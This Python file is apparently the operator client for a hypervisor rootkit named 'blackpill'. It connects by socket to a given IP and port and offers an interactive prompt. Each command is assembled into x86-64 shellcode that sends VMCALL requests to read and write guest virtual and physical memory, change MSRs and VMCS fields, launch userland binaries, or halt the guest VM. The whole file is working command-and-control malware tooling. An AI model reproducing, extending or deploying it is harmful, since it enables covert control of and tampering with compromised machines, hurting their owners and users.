import argparse
import socket

from enum import IntEnum
from typing import Callable, List

from keystone import Ks, KS_ARCH_X86, KS_MODE_64
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table

console = Console()

# Command registry
COMMAND_HANDLERS = {}


class Vmmcall(IntEnum):
    """VMMCALL commands."""

    READ_VIRT_MEM = 0x00
    WRITE_VIRT_MEM = 0x01
    LAUNCH_USERLAND_BINARY = 0x02
    CHANGE_MSR = 0x03
    CHANGE_CR = 0x04
    READ_PHYS_MEM = 0x05
    WRITE_PHYS_MEM = 0x06
    STOP = 0x07
    CHANGE_VMCS_FIELD = 0x08


class CommandHandlers:
    """Class to hold command handlers."""

    @staticmethod
    def help() -> None:
        """Display available commands."""
        table = Table(title="Available Commands", title_justify="left")
        table.add_column("Command", style="cyan", no_wrap=True)
        table.add_column("Description", style="white")
        table.add_row(
            "read_virt_memory <address>", "Read 4 bytes (32 bits) memory at 'address'"
        )
        table.add_row(
            "write_virt_memory <address> <value>",
            "Write 4 bytes (32 bits) memory at 'address'",
        )
        table.add_row(
            "launch_userland_binary <path>",
            "Launch a userland binary at 'path'",
        )
        table.add_row(
            "change_msr <msr> <value>",
            "Change the value of a Model Specific Register (MSR)",
        )
        table.add_row(
            "read_phys_memory <address> <value>",
            "Read 4 bytes (32 bits) of physical memory at 'address'",
        )
        table.add_row(
            "write_phys_memory <address> <value>",
            "Write 4 bytes (32 bits) of physical memory at 'address'",
        )
        table.add_row(
            "stop_execution",
            "Stop the execution of the guest VM",
        )
        table.add_row(
            "change_vmcs_field <field> <value>",
            "Change a VMCS field to 'value'",
        )
        table.add_row("help", "Show this help message")
        console.print(table)

    @staticmethod
    def read_virt_memory(args: List[str]) -> bytes:
        """Handle the 'read_virt_memory' command."""
        if len(args) != 1:
            raise ValueError("Usage: read_virt_memory <address>")
        address = int(args[0], 16)

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.READ_VIRT_MEM}
            mov r12, 0x{address}
            vmcall
            rdmsr
        """
        )

    @staticmethod
    def write_virt_memory(args: List[str]) -> bytes:
        """Handle the 'write_virt_memory' command."""
        if len(args) != 2:
            raise ValueError("Usage: write_virt_memory <address>")
        address = int(args[0], 16)
        value = int(args[1], 16)

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.WRITE_VIRT_MEM}
            mov r12, 0x{address}
            mov rcx, 0x{value}
            vmcall
            rdmsr
        """
        )

    @staticmethod
    def launch_userland_binary(args: List[str]) -> bytes:
        """Handle the 'launch_userland_binary' command."""
        if len(args) != 1:
            raise ValueError("Usage: launch_userland_binary <path>")
        path = (args[0] + "\0").encode()  # FIXME: should validate a valid LFS path

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.LAUNCH_USERLAND_BINARY}
            mov r12, {path}
            vmcall
            rdmsr
        """
        )

    @staticmethod
    def change_msr(args: List[str]) -> bytes:
        """Handle the 'change_msr' command."""
        # FIXME: Could list all available MSRs here for the user to choose from
        if len(args) != 2:
            raise ValueError("Usage: change_msr <msr> <value>")
        msr = int(args[0], 16)
        value = int(args[1], 16)

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.CHANGE_MSR}
            mov r12, {msr}
            mov rcx, {value}
            vmcall
            rdmsr
        """
        )

    @staticmethod
    def read_phys_memory(args: List[str]) -> bytes:
        """Handle the 'read_phys_memory' command."""
        if len(args) != 2:
            raise ValueError("Usage: read_phys_memory <address>")
        address = int(args[0], 16)
        value = int(args[1], 16)

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.READ_PHYS_MEM}
            mov r12, 0x{address}
            mov rcx, 0x{value}
            vmcall
            rdmsr
        """
        )

    @staticmethod
    def write_phys_memory(args: List[str]) -> bytes:
        """Handle the 'write_phys_memory' command."""
        if len(args) != 2:
            raise ValueError("Usage: write_phys_memory <address>")
        address = int(args[0], 16)
        value = int(args[1], 16)

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.WRITE_PHYS_MEM}
            mov r12, 0x{address}
            mov rcx, 0x{value}
            vmcall
            rdmsr
        """
        )

    @staticmethod
    def stop_execution(args: List[str]) -> bytes:
        """Handle the 'stop_execution' command."""
        if len(args) != 0:
            raise ValueError("Usage: stop_execution")

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.STOP}
            vmcall
            rdmsr
        """
        )

    @staticmethod
    def change_vmcs_field(args: List[str]) -> bytes:
        """Handle the 'change_vmcs_field' command."""
        if len(args) != 2:
            raise ValueError("Usage: change_vmcs_field <field> <value>")
        field = int(args[0], 16)
        value = int(args[1], 16)

        return assemble_instruction(
            f"""
            mov r14, {Vmmcall.CHANGE_VMCS_FIELD}
            mov r12, 0x{field}
            mov rcx, 0x{value}
            vmcall
            rdmsr
        """
        )


def assemble_instruction(assembly_code: str) -> bytes:
    """
    Assembles x86-64 assembly code into machine code using Keystone Engine.

    :param assembly_code: Assembly instructions as a string.
    :return: Machine code bytes.
    """
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    try:
        encoding, _count = ks.asm(assembly_code)
        return bytes(encoding)  # pyright: ignore[reportArgumentType]
    except Exception as e:
        raise RuntimeError(f"Failed to assemble instruction: {e}")


def register_command(name: str, handler: Callable[[List[str]], bytes]) -> None:
    """Register a command handler."""
    COMMAND_HANDLERS[name] = handler


def execute_command(sock: socket.socket, command: str, args: List[str]) -> None:
    """Execute a command by invoking its handler and sending data to the server."""
    if command not in COMMAND_HANDLERS:
        console.print(
            f"[bold red]Unknown command: {command}. Type 'help' for a list of commands.[/bold red]"
        )
        return

    # Handle help command separately
    if command == "help":
        COMMAND_HANDLERS["help"]()
        return

    try:
        payload = COMMAND_HANDLERS[command](args)
        shellcode = shellcode_to_c_array(payload)

        console.print(f"[green]Sending payload[/green]: {payload.hex()}")
        console.print(f"unsigned char shellcode[{len(payload)}] = {{shellcode}};")
        send_to_server(sock, payload)
    except Exception as e:
        console.print(f"[bold red]Error processing command '{command}': {e}[/bold red]")


def send_to_server(sock: socket.socket, payload: bytes) -> None:
    """Send data to the server and display the response."""
    sock.send(payload)
    response = sock.recv(4096)
    console.print(f"[bold green]->[/bold green] {response.hex()}")


def register_commands() -> None:
    """Register all available commands."""
    register_command(
        "help", CommandHandlers.help  # pyright: ignore[reportArgumentType]
    )
    register_command("read_virt_memory", CommandHandlers.read_virt_memory)
    register_command("write_virt_memory", CommandHandlers.write_virt_memory)
    register_command("launch_userland_binary", CommandHandlers.launch_userland_binary)
    register_command("change_msr", CommandHandlers.change_msr)
    register_command("read_phys_memory", CommandHandlers.read_phys_memory)
    register_command("write_phys_memory", CommandHandlers.write_phys_memory)
    register_command("stop_execution", CommandHandlers.stop_execution)
    register_command("change_vmcs_field", CommandHandlers.change_vmcs_field)


def shellcode_to_c_array(shellcode: bytes) -> str:
    """Convert shellcode bytes to a C array."""
    return ", ".join([f"0x{b:02x}" for b in shellcode])


def run_repl(sock: socket.socket) -> None:
    """Run the interactive REPL."""
    register_commands()

    while True:
        try:
            user_input = Prompt.ask("[bold yellow]blackpill[/bold yellow]").strip()
            if not user_input:
                continue
            parts = user_input.split()
            command, args = parts[0], parts[1:]
            execute_command(sock, command, args)
        except Exception as e:
            console.print(f"[bold red]Error:[/bold red] {e}")


def main() -> None:
    """Main entry point for the reverse shell client."""
    parser = argparse.ArgumentParser(
        description="Reverse shell client for interacting with a C module."
    )
    parser.add_argument("ip", type=str, help="IP address of the server")
    parser.add_argument("port", type=int, help="Port of the server")
    args = parser.parse_args()

    try:
        with socket.create_connection((args.ip, args.port)) as sock:
            console.print("[bold green]Connected to rootkit![/bold green]")
            run_repl(sock)
    except ConnectionError:
        console.print("[bold red]Failed to connect to rootkit. Exiting.[/bold red]")


if __name__ == "__main__":
    main()
